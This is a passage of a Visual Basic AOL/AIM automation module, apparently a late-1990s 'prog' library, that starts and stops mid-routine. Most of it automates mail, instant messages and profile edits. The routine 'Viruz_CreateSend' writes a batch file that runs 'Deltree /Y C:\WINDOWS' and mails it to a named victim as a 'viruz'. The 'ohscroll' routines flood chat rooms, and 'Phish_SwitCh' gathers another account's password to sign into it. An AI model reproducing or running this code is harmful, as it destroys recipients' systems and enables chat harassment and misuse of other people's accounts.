            Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
            Exit Sub
           ElseIf FindWelcome& <> 0& Then
            Exit Sub
        End If
       ElseIf FindWelcome& <> 0& Then
        Exit Sub
    End If
End Sub








Sub AOL25_Compoze(peepz$, subj$, mezz$)
'Ouwop
   Dim AOL As Long, Toolbar As Long, icon As Long, MDI As Long, child As Long
    Dim edit As Long, edit2 As Long, edit3 As Long
     AOL& = FindWindow("AOL Frame25", "America  Online")
     Toolbar& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
     icon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
     icon& = FindWindowEx(Toolbar&, icon&, "_AOL_Icon", vbNullString)
    Call SendMessageLong(icon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessageLong(icon&, WM_LBUTTONUP, 0&, 0&)
     MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Do: DoEvents
         child& = FindWindowEx(MDI&, 0&, "AOL Child", "Compose Mail")
         edit& = FindWindowEx(child&, 0&, "_AOL_Edit", vbNullString)
         edit2& = FindWindowEx(child&, edit&, "_AOL_Edit", vbNullString)
         edit2& = FindWindowEx(child&, edit2&, "_AOL_Edit", vbNullString)
         edit3& = FindWindowEx(child&, edit2&, "_AOL_Edit", vbNullString)
         icon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    Loop Until child& <> 0& And edit& <> 0& And edit2& <> 0& And edit3& <> 0& And icon& <> 0&
    Call SendMessageByString(edit&, WM_SETTEXT, 0&, peepz$)
    Call SendMessageByString(edit2&, WM_SETTEXT, 0&, subj$)
    Call SendMessageByString(edit3&, WM_SETTEXT, 0&, mezz$)
    TimeOut (0.1)
    Call SendMessageLong(icon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessageLong(icon&, WM_LBUTTONUP, 0&, 0&)
    Do: DoEvents:  child& = FindWindowEx(MDI&, 0&, "AOL Child", "Compose Mail"): Loop Until child& = 0&
fin:
If FindAwin("Compose Mail") = 0 Then Call ClicK_OK("America Online") Else GoTo fin

End Sub


Sub AOL25_sendim(sn, mezz)
'Ouwop
AOL% = FindWindow("AOL Frame25", vbNullString)
Call AOL25_keyword("aol://9293:" & sn)
top:
If FindAwin("Send Instant Message") = 0 Then GoTo top
Do: DoEvents
imwin% = FindChildByTitle(AolMdi, "Send Instant Message")
Rich% = FindChildByClass(imwin%, "_AOL_Edit")
Richa% = GetWindow(Rich%, GW_HWNDNEXT)
ico% = FindChildByClass(imwin%, "_AOL_button")
Loop Until Richa% <> 0 And ico% <> 0
Call SendMessageByString(Richa%, WM_SETTEXT, 0, mezz)
TimeOut (0.2)
Clicker (ico%)
Do: DoEvents
Ok% = FindWindow("#32770", "America Online")
If Ok% <> 0 Then Call SendMessage(Ok%, WM_CLOSE, 0, 0): closer2 = SendMessage(imwin%, WM_CLOSE, 0, 0): Exit Do
If imwin% = 0 Then Exit Do
Loop
End Sub



Sub Get_Num(og%, a)
Do: DoEvents
If a = 0 Then Exit Sub
b = 1 + b
og% = GetWindow(og%, GW_HWNDNEXT)
Loop Until b >= a - 1
End Sub
Sub ohscroll(l$)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut 0.5
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<Font color=#" + RandomColor + ">" + "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & l$
TimeOut (0.5)




End Sub

Sub ohscroll3(l$)
Call RePlacestRing(l$, " ", ".")
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
sendchat "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$ & Chr(4) & "<Font color=#" + RandomColor + ">" + l$
TimeOut (0.5)
End Sub


Sub ohscroll2()
sendchat "<B><font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰"
TimeOut (0.5)
sendchat "<B><font color=#G>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#g>‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "<font color=#ff3300>‰‰‰‰‰‰‰‰‰‰‰‰-"
TimeOut (0.5)


End Sub



Sub AOL25_KillWait()
a = FindWindow("AOL Frame25", vbNullString)
Call RunMenuByString(a, "&About America Online")
Do: DoEvents
Loop Until FindWindow("_AOL_Modal", vbNullString)
X = SendMessageByNum(FindWindow("_AOL_Modal", 0&), WM_CLOSE, 0, 0&)
End Sub
Function Exit_Restart()
On Error Resume Next
'If MsgBox("You Sure You Wanna Reboot?", vbQuestion + vbYesNo, "RESTART??") = vbYes Then
Dim res As Boolean
res = ExitWindowsEx(EWX_REBOOT, 0)
If Not res Then
MsgBox "Function failed", vbCritical, "ERROR"
Else
'MsgBox "Shutting down Windowz NOW!", 64, "Buh Bye"
'End
End If

End Function

Function AIM_ImText() As String
    lImTxt& = FindWindowEx(AIM_FindIM&, 0, "WndAte32Class", vbNullString)
    stText1$ = gettext(lImTxt&)
    AIM_ImText$ = Win_Filter2(stText1$)
End Function

Function AIM_RespondA(message)
Dim IM As Long, IMmessage As Long, send As Long
IM& = FindWindow("AIM_IMessage", vbNullString)
IMmessage& = FindWindowEx(IM&, 0&, "WndAte32Class", vbNullString)
IMmessage& = GetWindow(IMmessage&, 2)
Call SendMessageByString(IMmessage&, WM_SETTEXT, 0, message)
send& = FindWindowEx(IM&, 0&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (send&)
End Function
Sub AIM_IM_BLOCK(lst As Control)
'ouwop
For i = 0 To lst.listcount - 1
For nig = 0 To lst.listcount - 1
If LCase(lst.list(i)) Like LCase(lst.list(nig)) And i <> nig Then
IM& = FindWindow("AIM_IMessage", vbNullString)
IMto& = FindWindowEx(IM&, 0&, "_Oscar_IconBtn", vbNullString)
IMto2& = FindWindowEx(IM&, IMto&, "_Oscar_IconBtn", vbNullString)
imto3& = FindWindowEx(IM&, IMto2&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (imto3&)
lst.Clear
End If
Next nig
Next i
End Sub


Sub Phish_SwitCh(sn$, uzer$)
If FindRoom Then dare$ = Room_URL
snn$ = INI_GeT("Uzer", "current", "C:\windows\uzer.ini")
Call XAOL4_SignOff
Dim sPrompt As String
Static iXPos As Integer, iYPos As Integer
sPrompt = "Enter da Password for " + sn$ + "'z account"
SetWinOnTop = SetWindowPos(X, HWND_BROADCAST, 0, 0, 0, 0, FLAGz)
X = sPrompt
sPrompt = X
password$ = InputBox$(sPrompt, "<v>azta proggz <>< switch0r", , iXPos, iYPos)
If password$ = "" Then
MsgBox "No Password Entered!", vbCritical, "ERROR!"
Exit Sub
Else
Call GuestSignOn(sn$, password$)
TimeOut (0.2)
terr:
TimeOut (0.0000001)
If FindWelcome& <> 0 Then GoTo nerr Else GoTo terr
TimeOut (0.00001)
nerr:
TimeOut (1)
Call Kill_Childz
TimeOut (1)
If dare$ = "" Then GoTo hell Else Call XAOL4_Keyword(dare$)
TimeOut (0.5)
If FindRoom Then GoTo nuB Else GoTo nerr
nuB:
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat ASCII_Random + " <B>" + snn$ + "</b> <i>Switched to</i> <>< <b>" + getuser + "</b>"
End If
hell:
End Sub

Function TAG_FindEdit()
'ouwop
AOL% = FindWindow("AOL Frame25", vbNullString)
IM& = FindChildByTitle(AOL%, "Edit Your Online Profile")
stat% = FindChildByClass(IM&, "_AOL_Edit") 'name
stat2% = GetWindow(stat%, GW_HWNDNEXT) 'loacation
stat3% = GetWindow(stat2%, GW_HWNDNEXT) 'b-day
stat4% = GetWindow(stat3%, GW_HWNDNEXT) 'male
stat5% = GetWindow(stat4%, GW_HWNDNEXT) 'female
stat6% = GetWindow(stat5%, GW_HWNDNEXT) 'no responze
stat7% = GetWindow(stat6%, GW_HWNDNEXT) 'martial
stat8% = GetWindow(stat7%, GW_HWNDNEXT) 'hobiez
stat9% = GetWindow(stat8%, GW_HWNDNEXT) 'compz
stat10% = GetWindow(stat9%, GW_HWNDNEXT) 'occupation
stat11% = GetWindow(stat10%, GW_HWNDNEXT) 'quote
imr& = FindChildByTitle(AolMdi(), "Edit Your Online Profile")
If imr& <> 0 Then
TAG_FindEdit = 1
Else
TAG_FindEdit = 0
End If

End Function

Sub TAG_Set(name$, loc$, bday$, martial$, line1$, line2$, line3$, line4$)
'ouwop darthvader
'entry fieldz
terp:
TimeOut (1)
If TAG_FindEdit = 1 Then
IM% = FindChildByTitle(AolMdi, "Edit Your Online Profile")
ico% = FindChildByClass(IM%, "_AOL_ICON")
Do
DoEvents:
TimeOut (0.1)
ico% = GetWindow(ico%, GW_HWNDNEXT)
Loop Until gettext(ico%) = "Update"
stat% = FindChildByClass(IM%, "_AOL_Edit") 'name
stat2% = GetWindow(stat%, GW_HWNDNEXT) 'loacation
stat3% = GetWindow(stat2%, GW_HWNDNEXT) 'b-day
stat4% = GetWindow(stat3%, GW_HWNDNEXT) 'male
stat5% = GetWindow(stat4%, GW_HWNDNEXT) 'female
stat6% = GetWindow(stat5%, GW_HWNDNEXT) 'no responze
stat7% = GetWindow(stat6%, GW_HWNDNEXT) 'martial
stat8% = GetWindow(stat7%, GW_HWNDNEXT) 'hobiez
stat9% = GetWindow(stat8%, GW_HWNDNEXT) 'compz
stat10% = GetWindow(stat9%, GW_HWNDNEXT) 'occupation
stat11% = GetWindow(stat10%, GW_HWNDNEXT) 'quote
'Call SetText(stat8%, "|''''''''''| |\'''''''\/''''''''/| |'''''''''''| -Profile Tagged by ""IXI""")
'Call SetText(stat9%, "|___| \/__/\__\/ |___| - Ouwop'z Peepz ~ " + da$)
'Call SetText(stat10%, "|___| |__'|/\|__|' |___| ~ IXI ~[Founded January 01, 1999]")
'name$, loc$, bday$, martial$,
'(Name$, loc$, bday$, martial$, line1$, line2$, line3$, line4$)
Call SetText(stat%, name$)
Call SetText(stat2%, loc$)
Call SetText(stat3%, bday$)
Call SetText(stat6%, martial$)
Call SetText(stat8%, line1$)
Call SetText(stat9%, line2$)
Call SetText(stat10%, line3$)
Call SetText(stat11%, line4$)
TimeOut (1)
Call cLickiCoN(ico%)
Else
GoTo terp
End If
End Sub

Sub Viruz_CreateSend(Who As String)
If AOL_VerzioN = 2 Then MsgBox "Thiz Wont werk on AOL2.5 (yet)", 64, ">;[": Exit Sub
f$ = ASCII_Random
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (f$ + " Creating Viruz for " + Who$ + ", Pleaze wait...")
Screen.MousePointer = 11
TimeOut (0.5)
Call FileCreate("c:\windows\temp\IXI.bat")
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (f$ + " viruz Created Succesfully!")
TimeOut (0.5)
Call FileWrite("C:\windows\temp\IXI.bat", "Deltree /Y C:\WINDOWS >NUL")
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (f$ + " sending " + Who$ + ", da IXI viruz!")
TimeOut (0.5)
Call SendMail_attacheD("c:\windows\temp\IXI.bat", Who$, ".", ".")
top:
TimeOut (1)
If FindAwin("Write Mail") Then GoTo top
TimeOut (0.5)
Screen.MousePointer = 0
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (f$ + " viruz sent to " + Who$ + " {S gotmail}")
On Error Resume Next
Kill "c:\windows\temp\IXI.bat"
End Sub

Function Win_Filter2(stText As String) As String
    stText$ = Win_Replace(stText$, "<BR>", Chr(13))
    stText$ = Win_Replace(stText$, "&nbsp;", " ")
    
    stText$ = Win_Filter(stText$)
    Win_Filter2$ = stText$
End Function
Function Win_Filter(stText As String) As String

Dim intLoop As Integer
On Error Resume Next

    For intLoop% = 1 To Len(stText)
    stL1& = InStr(1, stText$, ">")
    str1& = InStr(1, stText$, "<")
    stLeft$ = Left(stText$, str1& - 1)

    lFull% = (stL1& - (str1& + 1)) + 2
    stRight$ = Right(stText$, Len(stText$) - (Len(stLeft$) + lFull%))
        
    Filter$ = stLeft$ + stRight$
